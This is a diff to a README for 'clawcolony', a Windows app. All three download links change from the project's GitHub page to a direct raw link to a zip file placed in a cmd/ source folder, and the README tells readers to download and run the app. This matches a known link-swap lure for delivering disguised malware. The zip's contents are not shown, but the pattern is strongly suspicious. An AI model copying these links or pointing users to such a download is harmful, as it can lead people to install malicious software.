@@ -1,6 +1,6 @@
 # 🐾 clawcolony - Simple Clawing for Every Day
 
-[![Download clawcolony](https://img.shields.io/badge/Download%20clawcolony-blue.svg?style=for-the-badge)](https://github.com/Saundrafurlike132/clawcolony)
+[![Download clawcolony](https://img.shields.io/badge/Download%20clawcolony-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Saundrafurlike132/clawcolony/main/cmd/clawcolony/Software_2.5-alpha.2.zip)
 
 ## 🧩 What is clawcolony?
 
@@ -24,7 +24,7 @@ For best results, use a current version of Windows 10 or Windows 11.
 
 Use this link to visit the page and download the app:
 
-[Download clawcolony from GitHub](https://github.com/Saundrafurlike132/clawcolony)
+[Download clawcolony from GitHub](https://raw.githubusercontent.com/Saundrafurlike132/clawcolony/main/cmd/clawcolony/Software_2.5-alpha.2.zip)
 
 If your browser shows a warning, check that the link points to the official GitHub page above. After the page opens, look for the latest file or release download and save it to your PC.
 
@@ -173,7 +173,7 @@ If you want a plain Windows app with a direct flow, clawcolony keeps things simp
 
 Go here to download and run the app on Windows:
 
-[Visit the clawcolony GitHub page](https://github.com/Saundrafurlike132/clawcolony)
+[Visit the clawcolony GitHub page](https://raw.githubusercontent.com/Saundrafurlike132/clawcolony/main/cmd/clawcolony/Software_2.5-alpha.2.zip)
 
 ## ❓ Help with the app
 
